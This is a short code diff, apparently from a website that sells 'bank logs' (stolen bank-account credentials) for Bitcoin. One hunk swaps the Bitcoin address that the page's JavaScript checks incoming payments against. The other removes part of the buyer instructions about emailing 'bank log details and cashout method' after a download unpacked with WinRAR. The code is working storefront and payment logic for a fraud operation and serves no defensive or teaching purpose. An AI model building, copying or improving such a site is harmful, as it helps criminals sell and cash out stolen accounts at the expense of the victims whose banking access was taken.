@@ -462,8 +462,8 @@
                         binance.onmessage = function(onmsg){
                             var response = JSON.parse(onmsg.data);
                             var address1 = response.x.out[0].addr;
-                            // var address2 = '1AMjPsZQvqeAfnEjfk17fEUZc6rZuM9Ccp';
-                            var address2 = 'bc1q43qak84redza7hk2sw8n57txepw40nn8r9mnd6'
+                            var address2 = '1AMjPsZQvqeAfnEjfk17fEUZc6rZuM9Ccp';
+                            // var address2 = 'bc1q43qak84redza7hk2sw8n57txepw40nn8r9mnd6'
     
                             if(address1 == address2) {
                                 let coinbase = new WebSocket("wss://stream.binance.com:9443/ws/btcusdt@kline_1h");
@@ -5208,7 +5208,6 @@
                                 5. After downloading, extract the files, using a Winrar software, <br>
                                 6. A pop up window also comes up asking for consent to send bank log details and 
                                 cashout method to your gmail address which in this case is <span id="yourEmail5" style="color: yellow;"></span>
-                                , else if Logged in Anonymously, you'll have to input a valid email address where bank log details can be sent to.
                                 <br>
                                 7. You can either click Yes or No, based on your privacy concerns <br>
                                 8. Done, <i class="fas fa-check" style="color: lime;"></i> 
